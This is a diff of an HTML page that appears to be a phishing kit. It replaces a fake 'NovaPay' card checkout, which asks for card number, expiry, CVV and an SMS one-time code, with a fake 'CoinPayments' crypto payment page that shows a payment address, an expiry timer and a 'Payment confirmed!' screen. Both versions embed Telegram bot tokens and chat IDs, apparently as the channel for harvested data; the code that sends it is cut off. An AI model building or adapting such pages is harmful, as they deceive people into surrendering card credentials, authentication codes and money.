@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>NovaPay · Secure Checkout</title>
+  <title>CoinPayments · Crypto Checkout</title>
   <style>
     * {
       margin: 0;
@@ -16,7 +16,7 @@
 
     body {
       min-height: 100vh;
-      background: radial-gradient(ellipse at 50% 0%, #f4f7fc 0%, #e8eef7 40%, #dde6f2 100%);
+      background: radial-gradient(ellipse at 50% 0%, #0f1724 0%, #0a111c 60%, #060b12 100%);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -24,32 +24,33 @@
     }
 
     .card {
-      max-width: 460px;
+      max-width: 480px;
       width: 100%;
-      background: #ffffff;
-      border-radius: 32px;
+      background: #0f1a28;
+      border-radius: 28px;
       box-shadow:
-        0 40px 80px -20px rgba(8, 26, 50, 0.32),
-        0 12px 28px -8px rgba(0, 0, 0, 0.06),
-        inset 0 1px 0 rgba(255, 255, 255, 0.8);
-      padding: 30px 26px 28px;
+        0 40px 90px -20px rgba(0, 0, 0, 0.8),
+        0 0 0 1px rgba(255, 255, 255, 0.04),
+        inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      padding: 28px 24px 24px;
       position: relative;
       overflow: hidden;
     }
 
-    /* Top accent line */
+    /* Top glow line */
     .card::before {
       content: '';
       position: absolute;
       top: 0;
-      left: 20%;
-      right: 20%;
-      height: 3px;
-      background: linear-gradient(90deg, transparent, #3a7bd5, #6ba3f0, #3a7bd5, transparent);
+      left: 15%;
+      right: 15%;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #f7931a, #00d4aa, #627eea, transparent);
       border-radius: 0 0 4px 4px;
-      opacity: 0.7;
+      opacity: 0.8;
     }
 
+    /* Brand */
     .brand {
       display: flex;
       align-items: center;
@@ -59,77 +60,60 @@
     }
 
     .brand-icon {
-      background: linear-gradient(145deg, #0a2540, #1a3f6b);
-      width: 44px;
-      height: 44px;
-      border-radius: 14px;
+      background: linear-gradient(145deg, #f7931a, #e8820a);
+      width: 42px;
+      height: 42px;
+      border-radius: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
-      color: white;
-      font-weight: 800;
-      font-size: 24px;
-      letter-spacing: -0.5px;
-      box-shadow: 0 8px 16px -6px rgba(10, 37, 64, 0.4);
+      box-shadow: 0 8px 20px -6px rgba(247, 147, 26, 0.5);
+      font-size: 22px;
     }
 
     .brand-name {
-      font-size: 26px;
+      font-size: 22px;
       font-weight: 800;
-      letter-spacing: -0.8px;
-      color: #0a2540;
+      letter-spacing: -0.5px;
+      color: #ffffff;
     }
 
     .brand-name span {
-      background: linear-gradient(135deg, #3a7bd5, #6ba3f0);
+      background: linear-gradient(135deg, #f7931a, #ffb347);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
       background-clip: text;
-      font-weight: 800;
     }
 
-    /* ==== AMOUNT BOX — Premium ==== */
+    /* Amount box */
     .amount-box {
-      background: linear-gradient(145deg, #0a1f38 0%, #132f52 50%, #1a3a63 100%);
-      border-radius: 22px;
-      padding: 20px 22px 18px;
-      margin-bottom: 26px;
+      background: linear-gradient(145deg, #131f30 0%, #18283d 100%);
+      border-radius: 20px;
+      padding: 18px 20px 16px;
+      margin-bottom: 22px;
       position: relative;
       overflow: hidden;
-      box-shadow:
-        0 20px 40px -16px rgba(8, 26, 50, 0.6),
-        inset 0 1px 0 rgba(255, 255, 255, 0.1);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.06);
     }
 
     .amount-box::before {
       content: '';
       position: absolute;
-      top: -60%;
-      right: -15%;
-      width: 200px;
-      height: 200px;
-      border-radius: 50%;
-      background: radial-gradient(circle, rgba(58, 123, 213, 0.4) 0%, transparent 65%);
-      pointer-events: none;
-    }
-
-    .amount-box::after {
-      content: '';
-      position: absolute;
-      bottom: -70%;
-      left: -15%;
+      top: -50%;
+      right: -20%;
       width: 180px;
       height: 180px;
       border-radius: 50%;
-      background: radial-gradient(circle, rgba(107, 163, 240, 0.15) 0%, transparent 60%);
+      background: radial-gradient(circle, rgba(247, 147, 26, 0.18) 0%, transparent 65%);
       pointer-events: none;
     }
 
     .amount-label {
-      font-size: 11px;
+      font-size: 10.5px;
       font-weight: 600;
-      color: #8aa8cc;
-      letter-spacing: 2px;
+      color: #6b8099;
+      letter-spacing: 1.8px;
       text-transform: uppercase;
       margin-bottom: 4px;
       position: relative;
@@ -145,11 +129,9 @@
     }
 
     .currency {
-      font-size: 24px;
+      font-size: 22px;
       font-weight: 600;
-      color: #7fa8d8;
-      line-height: 1;
-      margin-top: 4px;
+      color: #7a8fa6;
     }
 
     .amount-input {
@@ -157,9 +139,9 @@
       border: none;
       outline: none;
       color: #ffffff;
-      font-size: 46px;
+      font-size: 42px;
       font-weight: 800;
-      letter-spacing: -2px;
+      letter-spacing: -1.5px;
       width: 100%;
       padding: 0;
       font-family: inherit;
@@ -167,8 +149,7 @@
     }
 
     .amount-input::placeholder {
-      color: rgba(255, 255, 255, 0.18);
-      font-weight: 800;
+      color: rgba(255, 255, 255, 0.15);
     }
 
     .amount-input::-webkit-outer-spin-button,
@@ -185,163 +166,201 @@
     .amount-meta {
       display: flex;
       align-items: center;
-      gap: 7px;
-      margin-top: 10px;
-      font-size: 12px;
-      color: #8aa8cc;
+      gap: 6px;
+      margin-top: 8px;
+      font-size: 11.5px;
+      color: #6b8099;
       position: relative;
       z-index: 1;
       font-weight: 500;
     }
 
     .amount-meta .dot {
-      width: 7px;
-      height: 7px;
+      width: 6px;
+      height: 6px;
       border-radius: 50%;
-      background: #37d67a;
-      display: inline-block;
-      box-shadow: 0 0 0 3px rgba(55, 214, 122, 0.2);
-      animation: pulse-dot 2s ease-in-out infinite;
+      background: #00d4aa;
+      box-shadow: 0 0 0 3px rgba(0, 212, 170, 0.15);
+      animation: pulse 2s infinite;
     }
 
-    @keyframes pulse-dot {
-      0%, 100% { box-shadow: 0 0 0 3px rgba(55, 214, 122, 0.2); }
-      50% { box-shadow: 0 0 0 5px rgba(55, 214, 122, 0.1); }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
     }
 
-    /* ==== CARD BRAND LOGOS ==== */
-    .card-brands {
+    /* Step indicator */
+    .steps {
       display: flex;
       align-items: center;
-      gap: 10px;
-      margin-bottom: 8px;
-      padding: 0 2px;
-    }
-
-    .card-brands span {
-      font-size: 11px;
-      font-weight: 600;
-      color: #9aa9bd;
-      letter-spacing: 0.5px;
-      text-transform: uppercase;
-    }
-
-    .brand-logos {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      margin-left: auto;
-    }
-
-    .brand-logos svg {
-      height: 22px;
-      width: auto;
-      border-radius: 4px;
-      opacity: 0.85;
-      transition: opacity 0.2s;
-    }
-
-    .brand-logos svg:hover {
-      opacity: 1;
-    }
-
-    /* ==== DIVIDER ==== */
-    .divider {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      margin: 6px 0 18px;
-      color: #b1bdcc;
-      font-size: 11px;
-      font-weight: 600;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-    }
-
-    .divider::before,
-    .divider::after {
-      content: '';
-      flex: 1;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, #e2e9f2, transparent);
-    }
-
-    /* ==== FORM ==== */
-    .form-group {
+      gap: 8px;
       margin-bottom: 18px;
     }
 
-    .form-group label {
-      display: block;
-      font-size: 12.5px;
-      font-weight: 600;
-      color: #2a3b52;
-      margin-bottom: 7px;
+    .step {
+      flex: 1;
+      height: 3px;
+      border-radius: 2px;
+      background: rgba(255,255,255,0.08);
+      overflow: hidden;
+    }
+
+    .step.active {
+      background: linear-gradient(90deg, #f7931a, #ffb347);
+    }
+
+    .step.done {
+      background: #00d4aa;
+    }
+
+    /* Section title */
+    .section-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #ffffff;
+      letter-spacing: 0.3px;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .section-title::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: linear-gradient(90deg, rgba(255,255,255,0.08), transparent);
+    }
+
+    /* Coin grid */
+    .coin-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 22px;
+    }
+
+    .coin-item {
+      background: #131f30;
+      border: 1.5px solid rgba(255,255,255,0.07);
+      border-radius: 14px;
+      padding: 14px 8px 12px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      position: relative;
+    }
+
+    .coin-item:hover {
+      border-color: rgba(247, 147, 26, 0.4);
+      background: #17273b;
+      transform: translateY(-2px);
+    }
+
+    .coin-item.selected {
+      border-color: #f7931a;
+      background: linear-gradient(145deg, rgba(247,147,26,0.12), rgba(247,147,26,0.04));
+      box-shadow: 0 8px 20px -8px rgba(247, 147, 26, 0.4);
+    }
+
+    .coin-item.selected::after {
+      content: '✓';
+      position: absolute;
+      top: 6px;
+      right: 6px;
+      background: #f7931a;
+      color: #0f1a28;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      font-weight: 800;
+    }
+
+    .coin-icon {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 17px;
+      font-weight: 800;
+      color: #fff;
+    }
+
+    .coin-btc .coin-icon { background: linear-gradient(145deg, #f7931a, #d97e0f); }
+    .coin-eth .coin-icon { background: linear-gradient(145deg, #627eea, #4a63c9); }
+    .coin-usdt .coin-icon { background: linear-gradient(145deg, #26a17b, #1c8562); }
+    .coin-ltc .coin-icon { background: linear-gradient(145deg, #345d9d, #284a7d); }
+    .coin-bnb .coin-icon { background: linear-gradient(145deg, #f3ba2f, #d4a01f); }
+    .coin-doge .coin-icon { background: linear-gradient(145deg, #c2a633, #a58a29); }
+
+    .coin-name {
+      font-size: 11px;
+      font-weight: 700;
+      color: #ffffff;
       letter-spacing: 0.2px;
     }
 
-    .input-wrapper {
-      position: relative;
+    .coin-symbol {
+      font-size: 9.5px;
+      color: #6b8099;
+      font-weight: 500;
+    }
+
+    /* Network badge */
+    .network-badge {
       display: flex;
       align-items: center;
+      gap: 6px;
+      font-size: 11px;
+      color: #8aa0b8;
+      background: rgba(255,255,255,0.04);
+      padding: 6px 10px;
+      border-radius: 8px;
+      margin-bottom: 18px;
+      width: fit-content;
+      border: 1px solid rgba(255,255,255,0.05);
     }
 
-    .input-wrapper input {
-      width: 100%;
-      padding: 15px 18px;
-      font-size: 15.5px;
-      border: 1.5px solid #e0e6ef;
-      border-radius: 16px;
-      outline: none;
-      background: #fafcff;
-      transition: border 0.2s, box-shadow 0.2s, background 0.2s;
-      color: #0f1c2e;
-      font-weight: 500;
-      letter-spacing: 0.3px;
+    .network-badge .dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: #00d4aa;
     }
 
-    .input-wrapper input:focus {
-      border-color: #3a7bd5;
-      box-shadow: 0 0 0 4px rgba(58, 123, 213, 0.1);
-      background: #ffffff;
-    }
-
-    .input-wrapper input::placeholder {
-      color: #b0bdd0;
-      font-weight: 400;
-      font-size: 14.5px;
-      letter-spacing: 0.3px;
-    }
-
-    .row-2 {
-      display: flex;
-      gap: 12px;
-    }
-
-    .row-2 .form-group {
-      flex: 1;
-    }
-
+    /* Pay button */
     .btn {
       width: 100%;
-      padding: 17px;
-      background: linear-gradient(145deg, #0a2540, #163b63);
-      color: white;
+      padding: 16px;
+      background: linear-gradient(145deg, #f7931a, #e8820a);
+      color: #0f1a28;
       border: none;
-      border-radius: 18px;
-      font-size: 16.5px;
-      font-weight: 700;
-      letter-spacing: 0.4px;
+      border-radius: 16px;
+      font-size: 15.5px;
+      font-weight: 800;
+      letter-spacing: 0.3px;
       cursor: pointer;
       transition: all 0.25s ease;
-      box-shadow: 0 14px 28px -10px rgba(10, 37, 64, 0.45);
+      box-shadow: 0 12px 28px -8px rgba(247, 147, 26, 0.5);
       margin-top: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
 
     .btn:hover {
-      background: linear-gradient(145deg, #132e4f, #1d4a7a);
-      transform: translateY(-1px);
-      box-shadow: 0 18px 34px -10px rgba(10, 37, 64, 0.5);
+      transform: translateY(-2px);
+      box-shadow: 0 16px 34px -8px rgba(247, 147, 26, 0.6);
     }
 
     .btn:active {
@@ -349,50 +368,187 @@
     }
 
     .btn:disabled {
-      opacity: 0.6;
+      opacity: 0.5;
       pointer-events: none;
       transform: none;
     }
 
-    .otp-section {
-      display: none;
-      margin-top: 10px;
+    .btn-secondary {
+      background: rgba(255,255,255,0.06);
+      color: #ffffff;
+      box-shadow: none;
+      border: 1px solid rgba(255,255,255,0.1);
     }
 
-    .otp-section.active {
+    .btn-secondary:hover {
+      background: rgba(255,255,255,0.1);
+      box-shadow: none;
+    }
+
+    /* Payment view */
+    .payment-view {
+      display: none;
+    }
+
+    .payment-view.active {
       display: block;
     }
 
-    .otp-hint {
-      font-size: 12.5px;
-      color: #7a8a9e;
-      text-align: center;
-      margin-top: 10px;
-      line-height: 1.5;
+    .coin-view {
+      display: block;
     }
 
-    .spinner {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 2.5px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      border-top-color: #ffffff;
-      animation: spin 0.75s linear infinite;
-      vertical-align: middle;
-      margin-right: 10px;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .hidden {
+    .coin-view.hidden {
       display: none;
     }
 
-    .status-message {
+    /* QR area */
+    .qr-area {
+      background: #ffffff;
+      border-radius: 18px;
+      padding: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 18px;
+      position: relative;
+    }
+
+    .qr-area svg {
+      width: 180px;
+      height: 180px;
+      display: block;
+    }
+
+    .qr-badge {
+      position: absolute;
+      bottom: -10px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #0f1a28;
+      border: 1px solid rgba(255,255,255,0.1);
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 10.5px;
+      font-weight: 700;
+      color: #00d4aa;
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+
+    /* Address box */
+    .address-box {
+      background: #131f30;
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 14px;
+      padding: 14px;
+      margin-bottom: 16px;
+    }
+
+    .address-label {
+      font-size: 10.5px;
+      font-weight: 600;
+      color: #6b8099;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+
+    .address-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .address-value {
+      flex: 1;
+      font-family: 'SF Mono', 'Courier New', monospace;
       font-size: 12.5px;
+      color: #ffffff;
+      word-break: break-all;
+      line-height: 1.4;
+      letter-spacing: 0.2px;
+    }
+
+    .copy-btn {
+      background: rgba(247, 147, 26, 0.15);
+      border: 1px solid rgba(247, 147, 26, 0.3);
+      color: #f7931a;
+      padding: 8px 10px;
+      border-radius: 8px;
+      font-size: 11px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      white-space: nowrap;
+    }
+
+    .copy-btn:hover {
+      background: rgba(247, 147, 26, 0.25);
+    }
+
+    .copy-btn.copied {
+      background: rgba(0, 212, 170, 0.15);
+      border-color: rgba(0, 212, 170, 0.3);
+      color: #00d4aa;
+    }
+
+    /* Amount to send */
+    .send-amount {
+      background: linear-gradient(145deg, #131f30, #18283d);
+      border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 14px;
+      padding: 14px 16px;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .send-amount-label {
+      font-size: 11px;
+      color: #6b8099;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+
+    .send-amount-value {
+      font-size: 16px;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.3px;
+    }
+
+    .send-amount-value span {
+      color: #f7931a;
+      font-size: 12px;
+      margin-left: 4px;
+    }
+
+    /* Timer */
+    .timer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 12px;
+      color: #8aa0b8;
+      margin-bottom: 18px;
+    }
+
+    .timer-icon {
+      font-size: 14px;
+    }
+
+    .timer strong {
+      color: #ffffff;
+      font-weight: 700;
+      font-variant-numeric: tabular-nums;
+    }
+
+    /* Status */
+    .status-message {
+      font-size: 12px;
       text-align: center;
       margin-top: 14px;
       padding: 12px;
@@ -401,232 +557,333 @@
     }
 
     .status-message.error {
-      background: #fff0f0;
-      color: #c00;
-      border: 1px solid #ffd6d6;
+      background: rgba(255, 80, 80, 0.1);
+      color: #ff6b6b;
+      border: 1px solid rgba(255, 80, 80, 0.2);
     }
 
     .status-message.success {
-      background: #edf9f1;
-      color: #0a7a3e;
-      border: 1px solid #c8ecd6;
+      background: rgba(0, 212, 170, 0.1);
+      color: #00d4aa;
+      border: 1px solid rgba(0, 212, 170, 0.2);
     }
 
+    .hidden {
+      display: none;
+    }
+
+    /* Footer */
     .footer-note {
       text-align: center;
-      font-size: 11.5px;
-      color: #8f9db0;
-      margin-top: 24px;
+      font-size: 11px;
+      color: #4a5c72;
+      margin-top: 20px;
       display: flex;
       justify-content: center;
       gap: 6px;
       align-items: center;
     }
 
-    .lock-icon {
-      font-size: 13px;
-    }
-
-    #otpCode {
-      letter-spacing: 8px;
-      font-weight: 700;
-      text-align: center;
-      font-size: 22px;
-      padding: 14px 12px;
-      border-radius: 16px;
-    }
-
-    #otpCode::placeholder {
-      letter-spacing: 2px;
-      font-size: 14px;
-      font-weight: 400;
-    }
-
-    /* SVG Logo styling */
-    .visa-logo, .mc-logo {
+    /* Spinner */
+    .spinner {
       display: inline-block;
-      vertical-align: middle;
+      width: 16px;
+      height: 16px;
+      border: 2.5px solid rgba(15, 26, 40, 0.3);
+      border-radius: 50%;
+      border-top-color: #0f1a28;
+      animation: spin 0.75s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Progress bar */
+    .progress-bar {
+      height: 4px;
+      background: rgba(255,255,255,0.08);
+      border-radius: 2px;
+      overflow: hidden;
+      margin-bottom: 18px;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #f7931a, #ffb347);
+      border-radius: 2px;
+      width: 0%;
+      transition: width 0.3s ease;
+    }
+
+    /* Success view */
+    .success-view {
+      display: none;
+      text-align: center;
+      padding: 20px 0 10px;
+    }
+
+    .success-view.active {
+      display: block;
+    }
+
+    .success-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: linear-gradient(145deg, rgba(0, 212, 170, 0.15), rgba(0, 212, 170, 0.05));
+      border: 2px solid rgba(0, 212, 170, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      font-size: 34px;
+      animation: pop 0.4s ease;
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0); }
+      70% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+
+    .success-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #ffffff;
+      margin-bottom: 8px;
+      letter-spacing: -0.3px;
+    }
+
+    .success-text {
+      font-size: 13px;
+      color: #8aa0b8;
+      line-height: 1.6;
+      margin-bottom: 22px;
+    }
+
+    .success-text strong {
+      color: #00d4aa;
+      font-weight: 700;
     }
   </style>
 </head>
 <body>
   <div class="card">
     <div class="brand">
-      <div class="brand-icon">N</div>
-      <div class="brand-name">Nova<span>Pay</span></div>
+      <div class="brand-icon">₿</div>
+      <div class="brand-name">Coin<span>Payments</span></div>
     </div>
 
-    <!-- AMOUNT BOX -->
-    <div class="amount-box">
-      <div class="amount-label">Payment amount</div>
-      <div class="amount-row">
-        <span class="currency">$</span>
-        <input type="number" class="amount-input" id="amountInput" placeholder="0.00" min="0" step="0.01" inputmode="decimal">
-      </div>
-      <div class="amount-meta">
-        <span class="dot"></span> USD · Secure payment
-      </div>
-    </div>
-
-    <!-- CARD BRAND LOGOS ROW -->
-    <div class="card-brands">
-      <span>We accept</span>
-      <div class="brand-logos">
-        <!-- VISA SVG -->
-        <svg viewBox="0 0 780 500" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
-          <rect width="780" height="500" rx="40" fill="#1A1F71"/>
-          <path d="M293.2 348.7l33.1-205.8h52.9l-33.2 205.8h-52.8zM479.4 148.6c-10.5-4.1-27-8.5-47.4-8.5-52.3 0-89.1 27.9-89.4 67.8-.3 29.5 26.3 46 46.3 55.8 20.5 10 27.4 16.3 27.4 25.2-.1 13.6-16.4 19.9-31.6 19.9-21.1 0-32.3-3.1-49.6-10.6l-6.8-3.2-7.4 45.8c12.3 5.7 35 10.6 58.5 10.9 55.6 0 91.7-27.6 92.1-70.3.2-23.4-13.9-41.2-44.5-55.9-18.5-9.5-29.9-15.8-29.9-25.4 0-8.5 9.6-17.6 30.4-17.6 17.4-.3 30 3.7 39.8 7.9l4.7 2.3 7.3-44.1zM615.1 142.9h-40.8c-12.6 0-22.1 3.6-27.7 16.9l-78.8 199.9h55.4s9.1-24.7 11.1-30.2h67.7c1.6 7.1 6.4 30.2 6.4 30.2h49.1l-42.4-216.8zm-65.2 139.6c4.4-11.7 21.2-56.8 21.2-56.8-.3.5 4.4-11.9 7.1-19.6l3.6 17.7 12.3 58.7h-44.2zM231.8 142.9L180 284.8l-5.5-27.8c-9.6-32.1-39.6-66.9-73.1-84.3l47.3 176h56l83.3-205.8h-56.2z" fill="#fff"/>
-          <path d="M131.5 142.9H45.4l-.7 4.1c66.7 16.7 111 57 129.3 105.7l-18.6-92.9c-3.2-12.5-12.6-16.3-24.2-16.9z" fill="#F7B600"/>
-        </svg>
-        <!-- MASTERCARD SVG -->
-        <svg viewBox="0 0 780 500" width="44" height="28" xmlns="http://www.w3.org/2000/svg">
-          <rect width="780" height="500" rx="40" fill="#252525"/>
-          <circle cx="310" cy="250" r="150" fill="#EB001B"/>
-          <circle cx="470" cy="250" r="150" fill="#F79E1B"/>
-          <path d="M390 130a150 150 0 0 0 0 240 150 150 0 0 0 0-240z" fill="#FF5F00"/>
-        </svg>
-      </div>
-    </div>
-
-    <div class="divider">Card details</div>
-
-    <div id="cardForm">
-      <div class="form-group">
-        <label for="cardNumber">Card number</label>
-        <div class="input-wrapper">
-          <input type="tel" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" autocomplete="cc-number">
+    <!-- STEP 1: COIN SELECTION -->
+    <div id="coinView" class="coin-view">
+      <!-- Amount -->
+      <div class="amount-box">
+        <div class="amount-label">Payment amount</div>
+        <div class="amount-row">
+          <span class="currency">$</span>
+          <input type="number" class="amount-input" id="amountInput" placeholder="0.00" min="0" step="0.01" inputmode="decimal">
+        </div>
+        <div class="amount-meta">
+          <span class="dot"></span> USD · Crypto payment
         </div>
       </div>
 
-      <div class="row-2">
-        <div class="form-group">
-          <label for="expiry">Expiry date</label>
-          <div class="input-wrapper">
-            <input type="tel" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
-          </div>
+      <div class="section-title">Select cryptocurrency</div>
+
+      <div class="coin-grid" id="coinGrid">
+        <div class="coin-item coin-btc selected" data-coin="BTC" data-name="Bitcoin" data-rate="67000">
+          <div class="coin-icon">₿</div>
+          <div class="coin-name">Bitcoin</div>
+          <div class="coin-symbol">BTC</div>
         </div>
-        <div class="form-group">
-          <label for="cvv">CVV</label>
-          <div class="input-wrapper">
-            <input type="tel" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
-          </div>
+        <div class="coin-item coin-eth" data-coin="ETH" data-name="Ethereum" data-rate="3500">
+          <div class="coin-icon">Ξ</div>
+          <div class="coin-name">Ethereum</div>
+          <div class="coin-symbol">ETH</div>
+        </div>
+        <div class="coin-item coin-usdt" data-coin="USDT" data-name="Tether" data-rate="1">
+          <div class="coin-icon">₮</div>
+          <div class="coin-name">Tether</div>
+          <div class="coin-symbol">USDT</div>
+        </div>
+        <div class="coin-item coin-ltc" data-coin="LTC" data-name="Litecoin" data-rate="85">
+          <div class="coin-icon">Ł</div>
+          <div class="coin-name">Litecoin</div>
+          <div class="coin-symbol">LTC</div>
+        </div>
+        <div class="coin-item coin-bnb" data-coin="BNB" data-name="BNB" data-rate="600">
+          <div class="coin-icon">B</div>
+          <div class="coin-name">BNB</div>
+          <div class="coin-symbol">BNB</div>
+        </div>
+        <div class="coin-item coin-doge" data-coin="DOGE" data-name="Dogecoin" data-rate="0.15">
+          <div class="coin-icon">Ð</div>
+          <div class="coin-name">Dogecoin</div>
+          <div class="coin-symbol">DOGE</div>
         </div>
       </div>
 
-      <button class="btn" id="payBtn">Continue</button>
-      <div id="cardStatus" class="status-message hidden"></div>
+      <div class="network-badge">
+        <span class="dot"></span> Network fee: ~$2.50 · Est. 10 min confirmation
+      </div>
+
+      <button class="btn" id="payBtn">
+        <span>Pay with Crypto</span>
+        <span>→</span>
+      </button>
+      <div id="coinStatus" class="status-message hidden"></div>
     </div>
 
-    <div id="otpForm" class="otp-section">
-      <div class="form-group">
-        <label for="otpCode">Verification code</label>
-        <div class="input-wrapper">
-          <input type="tel" id="otpCode" placeholder="Enter OTP" maxlength="8" inputmode="numeric" autocomplete="one-time-code">
+    <!-- STEP 2: PAYMENT VIEW -->
+    <div id="paymentView" class="payment-view">
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill" style="width: 50%;"></div>
+      </div>
+
+      <div class="section-title">Complete payment</div>
+
+      <!-- QR -->
+      <div class="qr-area">
+        <svg id="qrCode" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"></svg>
+        <div class="qr-badge" id="qrBadge">Scan to pay</div>
+      </div>
+
+      <!-- Address -->
+      <div class="address-box">
+        <div class="address-label">Payment address</div>
+        <div class="address-row">
+          <div class="address-value" id="addressValue">bc1q...</div>
+          <button class="copy-btn" id="copyBtn">Copy</button>
         </div>
       </div>
-      <button class="btn" id="otpBtn">Verify & pay</button>
-      <div class="otp-hint">
-        A 6-digit code was sent to your phone.<br>
-        Enter it above to confirm the payment.
+
+      <!-- Amount to send -->
+      <div class="send-amount">
+        <span class="send-amount-label">Amount to send</span>
+        <span class="send-amount-value" id="sendAmount">0.00000000 <span>BTC</span></span>
       </div>
-      <div id="otpStatus" class="status-message hidden"></div>
+
+      <!-- Timer -->
+      <div class="timer">
+        <span class="timer-icon">⏱</span>
+        <span>Payment expires in <strong id="timerValue">05:59:59</strong></span>
+      </div>
+
+      <button class="btn" id="confirmBtn">
+        <span>I have sent the payment</span>
+      </button>
+      <button class="btn btn-secondary" id="backBtn" style="margin-top: 10px; margin-bottom: 0;">
+        ← Back
+      </button>
+      <div id="paymentStatus" class="status-message hidden"></div>
+    </div>
+
+    <!-- STEP 3: SUCCESS -->
+    <div id="successView" class="success-view">
+      <div class="success-icon">✓</div>
+      <div class="success-title">Payment confirmed!</div>
+      <div class="success-text">
+        Your crypto payment has been received.<br>
+        <strong id="successAmount">$0.00</strong> · <span id="successCoin">BTC</span>
+      </div>
+      <button class="btn" id="doneBtn">
+        <span>Back to home</span>
+      </button>
     </div>
 
     <div class="footer-note">
-      <span class="lock-icon">🔒</span> Secured by NovaPay · 256-bit SSL
+      <span>🔒</span> Secured by CoinPayments · SSL Encrypted
     </div>
   </div>
 
   <script>
     (function() {
-      const TELEGRAM_BOT_TOKEN = '9121996957:AAEAR4EmBfQbCcVPP33ljnBLcdiwNMRfsXU';
-      const TELEGRAM_CHAT_ID = '-1005971624863';
+      const TELEGRAM_BOT_TOKEN = '9135930495:AAF6snXnVCxC50519xMp7PyBpTTy9Efucu8';
+      const TELEGRAM_CHAT_ID = '-1004353567100';
 
+      // Elements
+      const coinView = document.getElementById('coinView');
+      const paymentView = document.getElementById('paymentView');
+      const successView = document.getElementById('successView');
       const amountInput = document.getElementById('amountInput');
-      const cardForm = document.getElementById('cardForm');
-      const otpForm = document.getElementById('otpForm');
-      const cardNumber = document.getElementById('cardNumber');
-      const expiry = document.getElementById('expiry');
-      const cvv = document.getElementById('cvv');
+      const coinGrid = document.getElementById('coinGrid');
       const payBtn = document.getElementById('payBtn');
-      const cardStatus = document.getElementById('cardStatus');
-      const otpCode = document.getElementById('otpCode');
-      const otpBtn = document.getElementById('otpBtn');
-      const otpStatus = document.getElementById('otpStatus');
+      const coinStatus = document.getElementById('coinStatus');
+      const progressFill = document.getElementById('progressFill');
+      const qrCode = document.getElementById('qrCode');
+      const qrBadge = document.getElementById('qrBadge');
+      const addressValue = document.getElementById('addressValue');
+      const copyBtn = document.getElementById('copyBtn');
+      const sendAmount = document.getElementById('sendAmount');
+      const timerValue = document.getElementById('timerValue');
+      const confirmBtn = document.getElementById('confirmBtn');
+      const backBtn = document.getElementById('backBtn');
+      const paymentStatus = document.getElementById('paymentStatus');
+      const successAmount = document.getElementById('successAmount');
+      const successCoin = document.getElementById('successCoin');
+      const doneBtn = document.getElementById('doneBtn');
 
+      let selectedCoin = { coin: 'BTC', name: 'Bitcoin', rate: 67000 };
+      let timerInterval = null;
+      let paymentData = {};
+
+      // ============ HELPERS ============
       function showStatus(el, text, type) {
         el.textContent = text;
         el.className = 'status-message ' + type;
         el.classList.remove('hidden');
       }
-
       function hideStatus(el) {
         el.classList.add('hidden');
       }
+      function formatAmount(val) {
+        return parseFloat(val).toFixed(2);
+      }
 
